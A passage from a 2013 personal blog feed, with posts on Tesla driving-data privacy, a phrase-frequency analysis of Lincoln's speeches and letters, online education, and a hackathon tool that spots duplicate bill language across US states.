<p>Before I had a smartphone, I remember drawing a map every time I went somewhere new so I wouldn’t get lost. I’m no longer doing that but still need to come up with a rough plan of when to visit the various places. The next step would be something that takes my list and applies a route finding algorithm to come up with an agenda that gets me to visit all the places while taking into account distance, open hours, and the venue type. Combine this with <a href="http://www.google.com/glass/start/" target="_blank">Google Glass</a> and you get  a pretty awesome way of exploring a new city. I’m excited.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Tesla and privacy</title>
   <link href="http://dangoldin.com/2013/02/21/tesla-and-privacy/"/>
   <updated>2013-02-21T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2013/02/21/tesla-and-privacy</id>
   <content:encoded><![CDATA[
<p>What’s lost in the <a href="http://www.teslamotors.com/blog/most-peculiar-test-drive">Tesla/NY Times discussion</a> is how much information Tesla is collecting. Tesla collected the location, the speed, and the battery charge throughout the journey and referenced it during the rebuttal. Is Tesla collecting this data for every car sold? Do the drivers know this data is being collected? If John Broder knew Tesla had this data from his drive <a href="http://www.nytimes.com/2013/02/10/automobiles/stalled-on-the-ev-highway.html">his review</a> would have turned out differently. We’re all in favor of truth and honesty in reporting but should it be this easy to share data? What prevents Elon Musk from digging into the driving data of a politician who proposes some legislation that will adversely impact Tesla and finds likely unethical behavior?</p>

<p>As <a href="http://online.wsj.com/article/SB10001424053111903480904576512250915629460.html">software eats the world</a>, data will be collected from more and more areas of our lives. Target is already <a href="http://www.nytimes.com/2012/02/19/magazine/shopping-habits.html?pagewanted=1&amp;_r=1&amp;hp">figuring out</a> whether you’re pregnant and this is just from using your purchase history. Combine that with other data sources, increased computation power, and cheaper data storage and companies end up knowing us better than we know ourselves. We need to make sure that our privacy evolves alongside the data. Currently, the concept of data privacy is too abstract to make us care. We need to see the actual data and the derived results in order to see how valuable it is. Only then will we want to protect it.</p>

<p>Disclosure: I love what Tesla is doing and own Tesla stock. I also realize that this data is used to offer a better, cheaper product. At the same time, I believe we need to find the right approach to privacy when it comes to our data.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>An analysis of Lincoln's words</title>
   <link href="http://dangoldin.com/2013/02/12/analysis-of-lincolns-words/"/>
   <updated>2013-02-12T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2013/02/12/analysis-of-lincolns-words</id>
   <content:encoded><![CDATA[
<p>On Saturday, I finished <a href="http://www.amazon.com/Team-Rivals-Political-Abraham-Lincoln/dp/0743270754">Team of Rivals</a> and while looking at my calendar noticed that it was also <a href="http://en.wikipedia.org/wiki/Abraham_Lincoln">Lincoln’s</a> birthday this week. What better way to celebrate his birthday than to analyze his speeches and letters? I downloaded the <a href="http://www.gutenberg.org/files/3253/3253-h/3253-h.htm">7 volume set</a> containing his speeches, letters, and essays from Project Gutenberg and spent a few hours on Sunday cleaning the text and writing a parsing script. On Monday, I started analyzing the text to see if I could make sense of it.</p>

<p>I was able to get 1,458 documents containing almost 16,500 sentences and a little over 547,000 words. I tried getting the date each letter was written or speech was given but was only able to get it for 60% of the documents. That was enough to get some insights.</p>

<h3>Number of speeches/letters by year</h3>
<p>I suspect a lot of his early writing and speeches and were lost since they just weren't preserved as well as his later speeches and letters</p>
<div id="volume-chart">
</div>

<h3>Trend of phrases</h3>
<p>I wanted to examine the phrases that he most commonly used over time in order to see whether there were any noticeable changes and whether they meant something. Turns out there was some interesting stuff here that's highlighted in green.</p>

<ul>
    <li><b>Slavery</b> - There are references to slavery across the entire date range with the <a href="http://en.wikipedia.org/wiki/Dred_Scott_v._Sandford">Dred Scott decision</a> and the <a href="http://en.wikipedia.org/wiki/Missouri_Compromise">Missouri Compromise</a> appearing as common phrases in the 1850s.</li>
    <li><b>Civil War Generals</b> - You can trace the career of the generals during the Civil War based on their mentions. <a href="http://en.wikipedia.org/wiki/Joseph_Hooker">General Hooker</a> was mentioned in 1862 and 1863; <a href="http://en.wikipedia.org/wiki/George_Meade">General Meade</a> in 1863 and 1864; and <a href="http://en.wikipedia.org/wiki/Ulysses_S._Grant">General Grant</a> in 1864 and 1865. This echoes history: General Hooker was replaced by General Meade in 1863 with General Grant being in command of the Union Army in October of 1863.</li>
    <li><b>The Presidency</b> - When Lincoln was elected president in 1860, he started finishing his letters with the phrase "Lincoln, President of." During the presidency we also see mentions of his cabinet: <a href="http://en.wikipedia.org/wiki/Edwin_M._Stanton">Stanton</a> and <a href="http://en.wikipedia.org/wiki/William_H._Seward">Seward</a>.</li>
</ul>

<p class="small">*The table below was generated by looking at the top 20 three word phrases used in each year range and then consolidated into a top 100 list across the entire dataset. The X indicates that the phrase was in the top 20 three word phrases for that year range. I highlighted the interesting rows in green.</p>
<table class="small table table-striped">
    <thead><tr> <th>phrase</th> <th>1832-1845</th>  <th>1846-1853</th>  <th>1854-1859</th>  <th>1860</th>   <th>1861</th>   <th>1862</th>   <th>1863</th>   <th>1864</th>   <th>1865</th>   </tr></thead>
<tbody>
<tr>    <td>the united states</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  </tr>
<tr>    <td>of the united</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  </tr>
<tr>    <td>i do not</td>   <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  </tr>
<tr>    <td>the secretary of</td>   <td></td>   <td>X</td>  <td>X</td>  <td></td>   <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  </tr>
<tr>    <td>secretary of war</td>   <td></td>   <td>X</td>  <td></td>   <td></td>   <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  </tr>
<tr>    <td>in regard to</td>   <td>X</td>  <td>X</td>  <td>X</td>  <td></td>   <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  </tr>
<tr>    <td>the people of</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  </tr>
<tr>    <td>of the people</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td></td>   <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  </tr>
<tr>    <td>president of the</td>   <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  </tr>
<tr>    <td>in favor of</td>    <td>X</td>  <td>X</td>  <td>X</td>  <td></td>   <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  </tr>
<tr>    <td>my dear sir</td>    <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td></td>   </tr>
<tr>    <td>as well as</td> <td>X</td>  <td>X</td>  <td>X</td>  <td></td>   <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  </tr>
<tr>    <td>so far as</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  </tr>
<tr class="highlight">    <td>dred scott decision</td>    <td></td>   <td></td>   <td>X</td>  <td></td>   <td></td>   <td></td>   <td></td>   <td></td>   <td></td>   </tr>
<tr>    <td>there is no</td>    <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  </tr>
<tr>    <td>by the president</td>   <td></td>   <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  </tr>
<tr>    <td>the supreme court</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td></td>   <td>X</td>  <td></td>   <td>X</td>  <td></td>   <td></td>   </tr>
<tr>    <td>united states and</td>  <td></td>   <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  </tr>
<tr>    <td>of the union</td>   <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  </tr>
<tr>    <td>that it is</td> <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  </tr>
<tr>    <td>it is a</td>    <td>X</td>  <td>X</td>  <td>X</td>  <td></td>   <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  </tr>
<tr>    <td>that judge douglas</td> <td></td>   <td></td>   <td>X</td>  <td></td>   <td></td>   <td></td>   <td></td>   <td></td>   <td></td>   </tr>
<tr class="highlight">    <td>the dred scott</td> <td></td>   <td></td>   <td>X</td>  <td></td>   <td></td>   <td></td>   <td></td>   <td></td>   <td></td>   </tr>
<tr>    <td>that there is</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  </tr>
<tr class="highlight">    <td>institution of slavery</td> <td>X</td>  <td></td>   <td>X</td>  <td></td>   <td>X</td>  <td>X</td>  <td></td>   <td></td>   <td></td>   </tr>
<tr>    <td>secretary of state</td> <td></td>   <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  </tr>
<tr class="highlight">    <td>the missouri compromise</td>    <td></td>   <td></td>   <td>X</td>  <td></td>   <td>X</td>  <td></td>   <td></td>   <td></td>   <td></td>   </tr>
<tr>    <td>to say that</td>    <td>X</td>  <td>X</td>  <td>X</td>  <td></td>   <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  </tr>
<tr>    <td>of the state</td>   <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  </tr>
<tr>    <td>the state of</td>   <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  </tr>
<tr>    <td>of the government</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  </tr>
<tr class="highlight">    <td>major general mcclellan</td>    <td></td>   <td></td>   <td></td>   <td></td>   <td>X</td>  <td>X</td>  <td>X</td>  <td></td>   <td></td>   </tr>
<tr>    <td>of the country</td> <td>X</td>  <td>X</td>  <td>X</td>  <td></td>   <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  </tr>
<tr>    <td>secretary of the</td>   <td></td>   <td>X</td>  <td>X</td>  <td></td>   <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  </tr>
<tr>    <td>of the army</td>    <td></td>   <td>X</td>  <td></td>   <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td></td>   </tr>
<tr>    <td>it is not</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  </tr>
<tr>    <td>of the potomac</td> <td></td>   <td></td>   <td></td>   <td></td>   <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  </tr>
<tr>    <td>part of the</td>    <td>X</td>  <td>X</td>  <td>X</td>  <td></td>   <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  </tr>
<tr>    <td>one of the</td> <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td></td>   </tr>
<tr>    <td>united states to</td>   <td></td>   <td></td>   <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  </tr>
<tr>    <td>washington d c</td> <td></td>   <td></td>   <td></td>   <td></td>   <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  </tr>
<tr>    <td>house of representatives</td>   <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  </tr>
<tr>    <td>as to the</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  </tr>
<tr>    <td>harper s ferry</td> <td></td>   <td></td>   <td></td>   <td></td>   <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  </tr>
<tr>    <td>the public safety</td>  <td></td>   <td></td>   <td></td>   <td></td>   <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td></td>   </tr>
<tr class="highlight">    <td>major general hooker</td>   <td></td>   <td></td>   <td></td>   <td></td>   <td></td>   <td>X</td>  <td>X</td>  <td></td>   <td></td>   </tr>
<tr>    <td>the gentleman from</td> <td>X</td>  <td>X</td>  <td>X</td>  <td></td>   <td></td>   <td></td>   <td></td>   <td></td>   <td></td>   </tr>
<tr class="highlight">    <td>lieutenant general grant</td>   <td></td>   <td></td>   <td></td>   <td></td>   <td></td>   <td></td>   <td></td>   <td>X</td>  <td>X</td>  </tr>
<tr class="highlight">    <td>major general halleck</td>  <td></td>   <td></td>   <td></td>   <td></td>   <td></td>   <td>X</td>  <td>X</td>  <td>X</td>  <td></td>   </tr>
<tr class="highlight">    <td>major general meade</td>    <td></td>   <td></td>   <td></td>   <td></td>   <td></td>   <td></td>   <td>X</td>  <td>X</td>  <td></td>   </tr>
<tr>    <td>of the enemy</td>   <td></td>   <td>X</td>  <td></td>   <td></td>   <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  </tr>
<tr>    <td>the union and</td>  <td></td>   <td>X</td>  <td>X</td>  <td></td>   <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  </tr>
<tr>    <td>the day of</td> <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  </tr>
<tr>    <td>the president of</td>   <td></td>   <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  </tr>
<tr>    <td>the rio grande</td> <td></td>   <td>X</td>  <td></td>   <td></td>   <td></td>   <td></td>   <td></td>   <td></td>   <td></td>   </tr>
<tr>    <td>the senate and</td> <td>X</td>  <td></td>   <td>X</td>  <td></td>   <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  </tr>
<tr>    <td>to the senate</td>  <td></td>   <td></td>   <td>X</td>  <td></td>   <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  </tr>
<tr>    <td>army of the</td>    <td></td>   <td>X</td>  <td></td>   <td></td>   <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  </tr>
<tr>    <td>city point va</td>  <td></td>   <td></td>   <td></td>   <td></td>   <td></td>   <td></td>   <td></td>   <td>X</td>  <td>X</td>  </tr>
<tr>    <td>and house of</td>   <td></td>   <td></td>   <td></td>   <td></td>   <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  </tr>
<tr>    <td>executive mansion washington</td>   <td></td>   <td></td>   <td></td>   <td></td>   <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  </tr>
<tr>    <td>of the treasury</td>    <td></td>   <td>X</td>  <td></td>   <td></td>   <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  </tr>
<tr>    <td>of the secretary</td>   <td></td>   <td></td>   <td></td>   <td></td>   <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  </tr>
<tr>    <td>of the bank</td>    <td>X</td>  <td></td>   <td>X</td>  <td></td>   <td></td>   <td></td>   <td></td>   <td></td>   <td></td>   </tr>
<tr>    <td>of the public</td>  <td>X</td>  <td>X</td>  <td></td>   <td></td>   <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td></td>   </tr>
<tr>    <td>of the war</td> <td></td>   <td>X</td>  <td>X</td>  <td></td>   <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  </tr>
<tr>    <td>yours very truly</td>   <td></td>   <td></td>   <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td></td>   </tr>
<tr>    <td>as may be</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td></td>   <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  </tr>
<tr>    <td>he did not</td> <td>X</td>  <td>X</td>  <td>X</td>  <td></td>   <td></td>   <td>X</td>  <td></td>   <td></td>   <td></td>   </tr>
<tr class="highlight">    <td>lincoln president of</td>   <td></td>   <td></td>   <td></td>   <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  </tr>
<tr>    <td>m stanton secretary</td>    <td></td>   <td></td>   <td></td>   <td></td>   <td></td>   <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  </tr>
<tr class="highlight">    <td>stanton secretary of</td>   <td></td>   <td></td>   <td></td>   <td></td>   <td></td>   <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  </tr>
<tr>    <td>the war department</td> <td></td>   <td>X</td>  <td></td>   <td></td>   <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  </tr>
<tr>    <td>i shall be</td> <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  </tr>
<tr class="highlight">    <td>william h seward</td>   <td></td>   <td></td>   <td></td>   <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  </tr>
<tr class="highlight">    <td>edwin m stanton</td>    <td></td>   <td></td>   <td></td>   <td></td>   <td></td>   <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  </tr>
<tr>    <td>for the purpose</td>    <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  </tr>
<tr>    <td>general grant city</td> <td></td>   <td></td>   <td></td>   <td></td>   <td></td>   <td></td>   <td></td>   <td>X</td>  <td>X</td>  </tr>
<tr>    <td>i have been</td>    <td>X</td>  <td>X</td>  <td>X</td>  <td></td>   <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  </tr>
<tr>    <td>is to be</td>   <td>X</td>  <td>X</td>  <td>X</td>  <td></td>   <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td></td>   </tr>
<tr>    <td>it will be</td> <td>X</td>  <td>X</td>  <td>X</td>  <td></td>   <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  </tr>
<tr>    <td>it would be</td>    <td>X</td>  <td>X</td>  <td>X</td>  <td></td>   <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  </tr>
<tr>    <td>of all the</td> <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  </tr>
<tr>    <td>of the department</td>  <td></td>   <td>X</td>  <td></td>   <td></td>   <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td></td>   </tr>
<tr>    <td>the post office</td>    <td>X</td>  <td>X</td>  <td></td>   <td></td>   <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td></td>   </tr>
<tr>    <td>the public lands</td>   <td>X</td>  <td>X</td>  <td></td>   <td></td>   <td></td>   <td>X</td>  <td>X</td>  <td>X</td>  <td></td>   </tr>
<tr>    <td>yours of the</td>   <td>X</td>  <td></td>   <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td></td>   </tr>
<tr>    <td>at p m</td> <td></td>   <td></td>   <td></td>   <td></td>   <td></td>   <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  </tr>
<tr>    <td>grant city point</td>   <td></td>   <td></td>   <td></td>   <td></td>   <td></td>   <td></td>   <td></td>   <td>X</td>  <td>X</td>  </tr>
<tr>    <td>h seward secretary</td> <td></td>   <td></td>   <td></td>   <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  </tr>
<tr>    <td>i have no</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  </tr>
<tr>    <td>in relation to</td> <td>X</td>  <td>X</td>  <td>X</td>  <td></td>   <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  </tr>
<tr>    <td>seward secretary of</td>    <td></td>   <td></td>   <td></td>   <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  </tr>
<tr>    <td>that i have</td>    <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  </tr>
<tr>    <td>as follows to</td>  <td>X</td>  <td>X</td>  <td></td>   <td></td>   <td></td>   <td>X</td>  <td>X</td>  <td></td>   <td>X</td>  </tr>
<tr>    <td>dear sir yours</td> <td></td>   <td></td>   <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td></td>   </tr>
<tr>    <td>sir yours of</td>   <td>X</td>  <td></td>   <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td></td>   </tr>
<tr>    <td>dear sir i</td> <td></td>   <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td></td>   </tr>
<tr>    <td>ought to be</td>    <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  </tr>
<tr>    <td>of the is</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td>X</td>  <td></td>   </tr>
</tbody>
</table>

<h3>Phrase word clouds</h3>
<p>I tried visualizing the table above as word clouds but in hindsight don't think it was the best way to display the data. It did give me an excuse to play around with <a href="http://d3js.org/">D3 library</a> though.</p>
<div id="text-clouds">
</div>

<p>As usual, the code’s up on <a href="https://github.com/dangoldin/lincoln-text-analysis">Github</a>.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>More thoughts on online education</title>
   <link href="http://dangoldin.com/2013/02/08/more-thoughts-on-online-education/"/>
   <updated>2013-02-08T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2013/02/08/more-thoughts-on-online-education</id>
   <content:encoded><![CDATA[
<p>I was excited to read that Coursera can now offer classes for college credit. I’m optimistic that this is a start of a trend that will change higher education. At first, this will be adopted by the motivated student - the one who took AP classes in high school and the price sensitive student - the one who took community college classes before transferring to a university. But over time, this will spread until it’s the dominant approach. It’s simply better. It may be more expensive to get a digital class together but it’s primarily an upfront cost that will be spent on getting the best lecturers, developing engaging lectures, and creating varied course content that’s optimized for different learning methods. This content can be accessed from anywhere and is always available.</p>

<p>These classes will serve as building blocks for entirely new curriculums and courses of study. Dependencies between classes will be created so if you’re having trouble with a part of one class you can quickly go to another class that covers that topic in more depth. Companies can get involved as well and help bring the costs down. For example, a company can subsidize a classes and in return be allowed to recruit students who score highest on various sections. Companies can even create their own funnels based on the performance over a set of classes. I don’t know if this is the right approach since it will lead to corporate influence in education but I’m excited by the opportunities. This is something prior generations never had and just a shadow of what future generations will have. I’m just glad it’s so easy to keep on learning after college.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Identifying duplicate bills across states</title>
   <link href="http://dangoldin.com/2013/02/05/identifying-duplicate-bills-across-states/"/>
   <updated>2013-02-05T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2013/02/05/identifying-duplicate-bills-across-states</id>
   <content:encoded><![CDATA[
<p>This past weekend I participated in the <a href="http://www.bdatafest.computationalreporting.com/">Bicoastal Datafest</a> hackathon that brought together journalists and hackers with the goal of analyzing money’s influence in politics. I came in with the idea of analyzing the evolution of a bill in order to see which politician made the various changes and relate that to campaign contributions. I quickly discovered that that wouldn’t be very easy, especially in two days, but I did meet <a href="https://twitter.com/llewellynhinkes">Llewellyn</a>, a journalist/hacker, who had a more practical idea of programmatically identifying bills across states that used the same language. The intuition behind this being that it would identify bills that were unlikely to have been written independently of one another and likely to have been influenced by a 3rd party.</p>

<p>We ended up with the following approach that we were able to code up during the weekend:</p>
<ol>
  <li>Use the OpenStates API to get the URL of the bills</li>
  <li>Download the bills and convert each to raw text - from PDF and HTML</li>
  <li>Extract 8 word phrases from each bill, excluding stopwords</li>
  <li>See which phrases were duplicated across states</li>
  <li>Examine the duplicate phrases to see which bills are most likely duplicates</li>
</ol>

<p>Somewhat surprisingly, this approach led us to discover the following duplicate bills:</p>

<h3>Firearms Freedom Acts</h3>
<p>Shared the phrase: <strong>manufactured without inclusion significant parts imported another state</strong></p>
<ul class="thumbnails">
  <li class="span3">
    <div class="thumbnail">
      <p>
        <a href="http://www.in.gov/legislative/bills/2013/PDF/FISCAL/SB0130.001.pdf">Indiana</a>
      </p>
      <img src="http://dangoldin.com/assets/static/images/gun1-in.png" alt="Tweets sent by hour" data-src="http://dangoldin.com/assets/static/images/gun1-in.png" width="977" height="718" layout="responsive"/>
    </div>
  </li>
  <li class="span3">
    <div class="thumbnail">
      <p>
        <a href="http://www.legislature.mi.gov/documents/2013-2014/billanalysis/Senate/htm/2013-SFA-0063-S.htm">Michigan</a>
      </p>
      <img src="http://dangoldin.com/assets/static/images/gun1-mi.png" alt="Tweets sent by hour" data-src="http://dangoldin.com/assets/static/images/gun1-mi.png" width="792" height="625" layout="responsive"/>
    </div>
  </li>
</ul>

<h3>Prohibit US government officials from enforcing firearm-related acts</h3>
<p>Shared the phrase: <strong>accessory ammunition owned manufactured commercially privately state remains</strong></p>
<ul class="thumbnails">
  <li class="span3">
    <div class="thumbnail">
      <p>
        <a href="http://www.azleg.gov//FormatDocument.asp?inDoc=/legtext/51leg/1r/summary/s.1112ps.doc.htm&amp;Session_ID=110">Arizona</a>
      </p>
      <img src="http://dangoldin.com/assets/static/images/gun2-az.png" alt="Tweets sent by hour" data-src="http://dangoldin.com/assets/static/images/gun2-az.png" width="789" height="402" layout="responsive"/>
    </div>
  </li>
  <li class="span3">
    <div class="thumbnail">
      <p>
        <a href="http://wapp.capitol.tn.gov/apps/billinfo/BillSummaryArchive.aspx?BillNumber=HB0042&amp;ga=108">Tennessee</a>
      </p>
      <img src="http://dangoldin.com/assets/static/images/gun2-tn.png" alt="Tweets sent by hour" data-src="http://dangoldin.com/assets/static/images/gun2-tn.png" width="872" height="505" layout="responsive"/>
    </div>
  </li>
</ul>

<h3>Prevent pharmaceutical substitution of opioid drugs</h3>
<p>Shared the phrase: <strong>bear labeling claim respect reduction tampering abuse abuse</strong></p>
<ul class="thumbnails">
  <li class="span3">
    <div class="thumbnail">
      <p>
        <a href="http://open.nysenate.gov/legislation/bill/S1753-2013">New York</a>
      </p>
      <img src="http://dangoldin.com/assets/static/images/drug-ny.png" alt="Tweets sent by hour" data-src="http://dangoldin.com/assets/static/images/drug-ny.png" width="924" height="563" layout="responsive"/>
    </div>
  </li>
  <li class="span3">
    <div class="thumbnail">
      <p>
        <a href="http://www.njleg.state.nj.us/2012/Bills/A3000/2590_S1.HTM">New Jersey</a>
      </p>
      <img src="http://dangoldin.com/assets/static/images/drug-nj.png" alt="Tweets sent by hour" data-src="http://dangoldin.com/assets/static/images/drug-nj.png" width="953" height="666" layout="responsive"/>
    </div>
  </li>
</ul>

<p>The code’s up on <a href="https://github.com/dangoldin/lawdiff">Github</a> so if you have any ideas or improvements - contribute and help out. In two days we were able to get something useful done and it’s exciting to see what we can discover if we stick with it.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Improving online programming classes</title>
   <link href="http://dangoldin.com/2013/02/01/improving-online-programming-classes/"/>
   <updated>2013-02-01T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2013/02/01/improving-online-programming-classes</id>
   <content:encoded><![CDATA[
<p>I’m making an effort to freshen up and improve my data skills so when I found out that two of my friends were going to take an <a href="https://class.coursera.org/compdata-002/class/index">R class</a> on Coursera, I joined them. The class is pretty typical for an online programming class: each week there are a set of lectures to watch, a quiz to take, and a programming exercise to do. In addition to this, we also have a weekly Google Hangout to discuss the lectures, go over our programs, and share our R questions.</p>

<p>I realize we’re still at the dawn of online education but it feels as if the class has simply been moved from the classroom to the web, without any thought as to how the class can be structured to make the best use of the web. So far, the Google Hangout paired with the programming exercises is the most valuable. The programming exercises provide the structure and the Google Hangouts help us absorb the material better. We are able to share our solutions, analyze the pros and cons of the different approaches, and by explaining why we solved them a certain way we end up understanding the material better ourselves. Why can’t online classes be designed to take advantage of this? I understand that not everyone has someone to take a class with and yet having a partner provides a big benefit.</p>

<p>These online programming classes should take a lesson from <a href="http://projecteuler.net/">Project Euler</a>. Project Euler is a series of puzzles that require both a mathematical and programming insight to solve. The brilliance is that they have forums for each problem that you can only access after solving the problem. But once you gain access, you can see other solutions, learn from them, and pick up tricks and approaches that you’ll need to solve future problems.</p>

<p>Pairing the structure provided by a class with this Project Euler community would create better online programming classes than we have now. My ideal online programming class would have the following structure:</p>

<ul>
